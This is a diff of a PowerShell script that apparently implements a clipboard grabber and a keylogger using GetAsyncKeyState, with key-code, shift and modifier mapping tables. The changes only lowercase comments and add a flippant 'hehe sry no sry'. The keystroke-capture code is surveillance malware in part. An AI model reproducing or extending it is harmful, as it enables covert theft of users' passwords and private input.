@@ -11,7 +11,7 @@ Required Dependencies: None
 <#
 .SYNOPSIS
 
-Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet
+Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet hehe sry no sry
 
 #>
     try {
@@ -48,44 +48,44 @@ Uses GetAsyncKeyState function from user32.dll to map key presses including spec
     $endTime = (Get-Date).AddSeconds($DurationInSeconds)
 
     $keyCodes = @{
-        8 = "`b"        # Backspace
-        13 = "`r`n"     # Enter
-        32 = " "        # Space
-        9 = "`t"        # Tab
-        46 = "DEL"      # Delete
+        8 = "`b"        # backspace
+        13 = "`r`n"     # enter
+        32 = " "        # space
+        9 = "`t"        # tab
+        46 = "DEL"      # delete
     }
 
     $shiftKeyMapping = @{
-        48 = ")" # for Shift + 0
-        49 = "!" # for Shift + 1
-        50 = "@" # for Shift + 2
-        51 = "#" # for Shift + 3
-        52 = "$" # for Shift + 4
-        53 = "%" # for Shift + 5
-        54 = "^" # for Shift + 6
-        55 = "&" # for Shift + 7
-        56 = "*" # for Shift + 8
-        57 = "(" # for Shift + 9
+        48 = ")" # for shift + 0
+        49 = "!" # for shift + 1
+        50 = "@" # for shift + 2
+        51 = "#" # for shift + 3
+        52 = "$" # for shift + 4
+        53 = "%" # for shift + 5
+        54 = "^" # for shift + 6
+        55 = "&" # for shift + 7
+        56 = "*" # for shift + 8
+        57 = "(" # for shift + 9
     }
 
     $nonPrintableKeys = @{
-        27 = "ESC" # Escape
-        33 = "PGUP" # Page Up
-        34 = "PGDN" # Page Down
-        35 = "END" # End
-        36 = "HOME" # Home
-        37 = "LEFT" # Left Arrow
-        38 = "UP" # Up Arrow
-        39 = "RIGHT" # Right Arrow
-        40 = "DOWN" # Down Arrow
+        27 = "ESC" # escape
+        33 = "PGUP" # page up
+        34 = "PGDN" # page down
+        35 = "END" # end
+        36 = "HOME" # home
+        37 = "LEFT" # left arrow
+        38 = "UP" # up arrow
+        39 = "RIGHT" # right arrow
+        40 = "DOWN" # down arrow
     }
 
     $previousState = @{}
     $modifiers = @{
-        16 = $false # Left Shift
-        160 = $false # Right Shift
-        17 = $false # Ctrl
-        18 = $false # Alt
+        16 = $false # left shift
+        160 = $false # right shift
+        17 = $false # ctrl
+        18 = $false # alt
     }
 
     function Get-Character {
